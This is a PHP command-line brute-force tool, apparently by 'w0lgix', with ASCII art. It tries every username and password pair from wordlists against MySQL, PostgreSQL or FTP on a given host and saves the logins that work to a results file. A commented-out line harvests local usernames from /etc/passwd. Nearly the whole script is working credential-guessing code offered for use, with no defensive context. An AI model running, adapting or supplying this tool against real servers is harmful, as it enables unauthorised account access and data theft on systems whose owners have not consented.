<?php
$art = "
                        .OO
                       .OOOO
                      .OOOO'
                      OOOO'          .-~~~~-.
                      OOO'          /   (o)(o)
              .OOOOOO `O .OOOOOOO. /      .. |
          .OOOOOOOOOOOO OOOOOOOOOO/\    \____/
        .OOOOOOOOOOOOOOOOOOOOOOOO/ \\   ,\_/
       .OOOOOOO%%OOOOOOOOOOOOO(#/\     /.
      .OOOOOO%%%OOOOOOOOOOOOOOO\ \\  \/OO.
     .OOOOO%%%%OOOOOOOOOOOOOOOOO\   \/OOOO.
     OOOOO%%%%OOOOOOOOOOOOOOOOOOO\_\/\OOOOO
     OOOOO%%%OOOOOOOOOOOOOOOOOOOOO\###)OOOO
     OOOOOO%%OOOOOOOOOOOOOOOOOOOOOOOOOOOOOO
     OOOOOOO%OOOOOOOOOOOOOOOOOOOOOOOOOOOOOO
     `OOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOO'
   .-~~\OOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOO'
  / _/  `\(#\OOOOOOOOOOOOOOOOOOOOOOOOOOOO'
 / / \  / `~~\OOOOOOOOOOOOOOOOOOOOOOOOOO'
|/'  `\//  \\ \OOOOOOOOOOOOOOOOOOOOOOOO'
       `-.__\_,\OOOOOOOOOOOOOOOOOOOOO'
      jgs  `OO\#)OOOOOOOOOOOOOOOOOOO'
             `OOOOOOOOO''OOOOOOOOO'
               `'''''''  `''''''''
";
error_reporting(0);
$sqlserver = $argv[1];
$host = $argv[2];
$listuser = $argv[3];
$listpass = $argv[4];

$a="\033[1;31mservice <Postgresql> <Ftp> <Mysql>\033[1;m\n";

if($host == null or $listuser == null or $listpass == null ){
	system("clear");
	echo $art."\n";
	echo $a;
	exit("Example: <service> <localhost> <users.txt> <pass.txt>\n");
	
}
switch ($sqlserver) {
	


case 'mysql':
	
echo ($a="\033[1;31m\tMySql BruteForce Coded By w0lgix\033[1;m\n");
sleep(2);


if($host == null or $listuser == null or $listpass == null ){
	system("clear");
	echo $a;
	exit("Example: <localhost> <users.txt> <pass.txt>\n");
	
}

$open = fopen($listuser, "r");
$read = fread($open, filesize($listuser));
fclose($open);

$users = explode("\n", $read);


$open1 = fopen($listpass, "r");
$read1 = fread($open1, filesize($listpass));
fclose($open1);

$passs = explode("\n", $read1);


foreach ($users as $user) {
	
foreach ($passs as $pass) {

$i = 0;


if(@mysql_connect($host,$user,$pass))
{
	echo "\033[1;34mConnected Secssful\033[1;m\n";
	echo "user is \033[1;33m$user\033[1;m and password is \033[1;35m$pass\033[1;m\n";

	$rezult=fopen("rezult.txt", "a");
	$write=fwrite($rezult, "[+]$host >> user:$user pass:$pass ($sqlserver)\n");
	fclose($rezult);
	
}

else 
{

	echo "Trying...\n";
	
}

}
}
##########################################################################################
break;

case 'postgresql':

echo ($a="\033[1;31m\tPostgres BruteForce Coded By w0lgix\033[1;m\n");
sleep(2);


if($host == null or $listuser == null or $listpass == null ){
	system("clear");
	echo $a;
	exit("Example: <localhost> <users.txt> <pass.txt>\n");
	
}

$open = fopen($listuser, "r");
$read = fread($open, filesize($listuser));
fclose($open);

$users = explode("\n", $read);


$open1 = fopen($listpass, "r");
$read1 = fread($open1, filesize($listpass));
fclose($open1);

$passs = explode("\n", $read1);


foreach ($users as $user) {
	
foreach ($passs as $pass) {

//$dbconn3 = pg_connect("host=sheep port=5432 dbname=mary user=lamb password=foo");

if(@pg_connect("host=$host port=5432 dbname=public user=$user password=$pass"))
{
	echo "\033[1;34mConnected Secssful\033[1;m\n";
	echo "user is \033[1;33m$user\033[1;m and password is \033[1;35m$pass\033[1;m\n";

	$rezult=fopen("rezult.txt", "a");
	$write=fwrite($rezult, "[+]$host >> user:$user pass:$pass ($sqlserver)\n");
	fclose($rezult);
	
}

else 
{

	echo "Trying...\n";
	
}

}
}

break;

#############################################################################################

case 'ftp':
	
echo ($a="\033[1;31m\tftp BruteForce Coded By w0lgix\033[1;m\n");

error_reporting(0);
//awk -F":" '{ print $1 }' /etc/passwd



if($host == null or $listuser == null or $listpass == null ){

	system('clear');
/*
	$path = getcwd();
	system("awk -F':' '{ print $1 }' /etc/passwd > $path/users.txt");
*/
	echo $a;
	echo "Example: <service> <localhost> <users.txt> <pwd.txt>\n";
	die();

}






$open = fopen($listuser, 'r');
$read = fread($open, filesize($listuser));
fclose($open);

$ftp_user_name1 = explode("\n", $read);
	
foreach ($ftp_user_name1 as $users) {
 
$open1 = fopen($listpass, 'r');
$read1 = fread($open1, filesize($listpass));
fclose($open1);
$ftp_user_pass1 = explode("\n", $read1);

foreach ($ftp_user_pass1 as $key) {
	
// login with username and password  
$conn_id = ftp_connect($host); 

$login_result = ftp_login($conn_id, $users, $key); 
// check connection 
if ($login_result) {  

        $open3 = fopen("rezult.txt", "a+");
		$read3 = fwrite($open3, "[+]$host >> user:$users pass:$key ($sqlserver)\n");
		fclose($open3);
        echo "\033[1;33m$users \t $key\n\033[1;m"; 

	} 
else 
	{ 
		
        echo "Trying...\n";
        
    } 

	   }
		  }

	break;


default:
		echo "\tPostgres Or Mysql Or Ftp\n";
		break;

}

?>
